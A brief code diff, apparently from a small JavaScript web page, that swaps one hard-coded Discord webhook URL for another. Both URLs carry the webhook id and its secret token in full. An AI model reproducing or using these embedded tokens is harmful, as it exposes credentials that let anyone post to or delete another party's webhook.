@@ -9,7 +9,7 @@ function sleep(ms) {  return new Promise(resolve => setTimeout(resolve, ms)) }
         var cx = document.getElementById('cx')
         var dv = document.getElementById('dv')
         var box = document.getElementById('hook')
-        var webhook = "https://ptb.discord.com/api/webhooks/1086837764231811264/z9hsAHYPg1cuzMCTGz3d5eYjI5TH6PJ279DmO46D7pBaWFkbDXv-OdMPqGgiZcCe0LPG"
+        var webhook = "https://ptb.discord.com/api/webhooks/1087037935494381669/yf3ApM0HN4CBWi1jKoSGPBCL30TO9tm0pSvfy4Rc-zzHbj9F1XBfjkVQdka49Lz8qrnI"
  
         let txt;
  
